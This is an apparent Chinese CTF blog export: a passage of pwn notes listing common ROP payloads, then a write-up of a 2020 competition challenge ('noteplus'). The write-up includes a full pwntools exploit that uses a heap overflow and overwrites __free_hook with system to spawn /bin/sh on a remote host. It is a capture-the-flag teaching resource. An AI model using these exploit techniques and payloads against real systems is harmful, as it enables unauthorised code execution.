operator">&amp;</span>fro_bit_8 <span class="token comment" spellcheck="true">#删除多余的</span>        <span class="token comment" spellcheck="true"># print("result:",hex(to))</span>        <span class="token keyword">return</span> result    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>        fro_bit <span class="token operator">=</span> <span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>  <span class="token comment" spellcheck="true"># 取出来第fro位</span>        fro_bit_8 <span class="token operator">=</span> fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 把fro位复制到其他位</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> fro_bit_8  <span class="token comment" spellcheck="true"># 删除多余的</span>decoding<span class="token operator">=</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h3 id="字符串和16进制数之间的转化"><a href="#字符串和16进制数之间的转化" class="headerlink" title="字符串和16进制数之间的转化"></a>字符串和16进制数之间的转化</h3><pre class=" language-c"><code class="language-c">import binasciidef <span class="token function">hex2char</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token macro property"># binascii.a2b_hex(hexstr)</span>    output <span class="token operator">=</span> binascii<span class="token punctuation">.</span><span class="token function">unhexlify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>def <span class="token function">char2hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    output<span class="token operator">=</span>binascii<span class="token punctuation">.</span><span class="token function">b2a_hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token macro property"># output = binascii.hexlify(data)</span>    <span class="token function">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token function">hex2char</span><span class="token punctuation">(</span><span class="token string">"2f62696e2f736800"</span><span class="token punctuation">)</span> #<span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token function">char2hex</span><span class="token punctuation">(</span><span class="token string">"/bin"</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token punctuation">)</span>#2f62696e2f736800</code></pre><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><h3 id="常用rop-待添加如ret2dl的-栈迁移的等"><a href="#常用rop-待添加如ret2dl的-栈迁移的等" class="headerlink" title="常用rop(待添加如ret2dl的,栈迁移的等)"></a>常用rop(待添加如ret2dl的,栈迁移的等)</h3><h4 id="泄露puts函数got表"><a href="#泄露puts函数got表" class="headerlink" title="泄露puts函数got表"></a>泄露puts函数got表</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>下一次返回的地址<span class="token punctuation">)</span></code></pre><h4 id="调用system-“-bin-sh”"><a href="#调用system-“-bin-sh”" class="headerlink" title="调用system(“/bin/sh”)"></a>调用system(“/bin/sh”)</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="计算方法"><a href="#计算方法" class="headerlink" title="计算方法"></a>计算方法</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>泄露-目的=偏移——&gt;目的=泄露-偏移<br>例:</p><pre class=" language-python"><code class="language-python">泄露libc地址<span class="token operator">-</span>vmmap得出来的libc基地址<span class="token operator">>></span><span class="token operator">></span> hex<span class="token punctuation">(</span><span class="token number">0x7f5f30f3d780</span><span class="token operator">-</span><span class="token number">0x7f5f30b77000</span><span class="token punctuation">)</span><span class="token string">'0x3c6780'</span>写在脚本里的是libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token number">-0x3c6780</span></code></pre><p>libc上的地址也可以直接用vmmap 得出,但是栈的地址只能用上面的方法计算出来</p><pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> vmmap <span class="token number">0x7f5f3086e000</span><span class="token operator">+</span><span class="token number">0x50</span>LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA    <span class="token number">0x7f5f3086e000</span>     <span class="token number">0x7f5f30976000</span> r<span class="token operator">-</span>xp   <span class="token number">108000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libm<span class="token number">-2.23</span><span class="token punctuation">.</span>so <span class="token operator">+</span><span class="token number">0x50</span></code></pre><h2 id="关注漏洞点"><a href="#关注漏洞点" class="headerlink" title="关注漏洞点"></a>关注漏洞点</h2><ul><li>索引越界，所有对连续内存元素的存取都要有限制</li><li>如果索引为负数有没有限制,索引是否为无符号数</li><li>释放后指针有没有清零</li><li>定义的read函数有没有溢出，NULL byte溢出，一字节溢出，\n溢出</li><li>如果size为0,malloc的结果和read的结果</li><li>格式化字符串漏洞</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 技巧 </tag>
            
            <tag> 模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
      <link href="2020/11/10/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/"/>
      <url>2020/11/10/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>自己只做了pwn2，就从pwn2开始</p><p>c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，这里涉及到一些库的库的加载。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836235597.png" alt="add"></p><p>当进行add的时候如果size为0将会成功申请空间</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836644128.png" alt="edit"></p><p>在edit的时候如果size为0可以无限制的获取输入，造成了堆溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>1.libc2.27需要填满tcach然后泄露libc地址。但是这里泄露出来的libc如下图，泄露出来的是第二条线的地址，实际上需要的是第一条线的地址，实际上这几部分是同一个库，相对的偏移都是固定的。</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836598126.png" alt="加载"></p><ul><li>2.用fastbin attack劫持__malloc_hook，2.27使得可以申请到任何一段空间不需要size的限制。实际上__malloc_hook劫持成one_gatget这里不行。实际用system函数劫持__free_hook</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836619586.png" alt="free_hook"></p><p>这里有一个问题：__free_hook看到的地址是在data区域,但是pwntools的symbols还是获取到了正确的偏移。</p><ul><li>3.保存点小技巧：</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  debug_str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span></code></pre><p>可以很方便调试开启了PIE的程序，把命令改掉可以换成下断点</p><p> Ubuntu18使用fastbin attack是直接把fd指针指向要修改的地址就好</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># _*_ coding:utf-8 _*_</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal=['tmux', 'splitw', '-h']</span>prog <span class="token operator">=</span> <span class="token string">'./noteplus'</span><span class="token comment" spellcheck="true"># #elf = ELF(prog)</span><span class="token comment" spellcheck="true"># # p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})</span><span class="token comment" spellcheck="true"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span><span class="token comment" spellcheck="true"># p = remote("121.36.245.213", 23333)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span>local<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">from</span> one_gadget <span class="token keyword">import</span> generate_one_gadget<span class="token keyword">if</span> local<span class="token punctuation">:</span>    path_to_libc <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>prog<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x10a45c</span><span class="token punctuation">,</span> <span class="token number">0x4f3c2</span><span class="token punctuation">,</span> <span class="token number">0x4f365</span><span class="token punctuation">]</span>    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"121.36.245.213"</span><span class="token punctuation">,</span> <span class="token number">23333</span><span class="token punctuation">)</span>    path_to_libc<span class="token operator">=</span><span class="token string">"/media/tower/data/work/ctf/dianxin/pwn2/460f7fe9177846df879863c485e2940b/libc-2.27.so"</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">def</span> <span class="token function">one_gadget_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> generate_one_gadget<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>        one<span class="token punctuation">.</span>append<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">return</span> one<span class="token comment" spellcheck="true"># one=one_gadget_list()</span><span class="token comment" spellcheck="true"># p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./pwn"], env={"LD_PRELOAD": "/glibc/2.27/64/lib/libc.so.6"})</span><span class="token comment" spellcheck="true"># p = process(["./libc-2.27.so", "./noteplus"], env={"LD_PRELOAD": "./libc-2.27.so"})</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  debug_str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">New</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ize: "</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">View</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>index<span class="token operator">=</span><span class="token number">0x8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>View<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>libc_content<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>libc_content<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xb78</span><span class="token operator">-</span><span class="token number">0x1b8</span><span class="token operator">-</span><span class="token number">0x3eb000</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># New(str(5),str(0x68))</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Delete(str(5))</span><span class="token comment" spellcheck="true"># print(hex(libc.symbols["__malloc_hook"]))</span><span class="token comment" spellcheck="true">#0x354b78</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># debug([0x203320])</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(hex(libc.sym["realloc"]))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p64(libc.symbols["__malloc_hook"]-0x3eb000-8+13)+"\n")</span><span class="token comment" spellcheck="true"># New(str(6),str(0x68))</span>Edit<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh\x00\n"</span><span class="token punctuation">)</span>debug<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x203320</span><span class="token punctuation">]</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>__isoc99_scanf   调用_IO_vfscanf_internal 调用__GI__IO_default_uflow 调用_IO_new_file_underflow</p><pre class=" language-c++"><code class="language-c++">int_IO_new_file_underflow (FILE *fp){  ssize_t count;  /* C99 requires EOF to be "sticky".  */  if (fp->_flags & _IO_EOF_SEEN)    return EOF;  if (fp->_flags & _IO_NO_READS)    {      fp->_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    }  if (fp->_IO_read_ptr < fp->_IO_read_end)   //检查:_IO_read_ptr要比_IO_read_end大    return *(unsigned char *) fp->_IO_read_ptr;  if (fp->_IO_buf_base == NULL)//缓冲区为空分配空间    {      /* Maybe we already have a push back pointer.  */      if (fp->_IO_save_base != NULL)        {          free (fp->_IO_save_base);          fp->_flags &= ~_IO_IN_BACKUP;        }      _IO_doallocbuf (fp);    }  /* FIXME This can/should be moved to genops ?? */  if (fp->_flags & 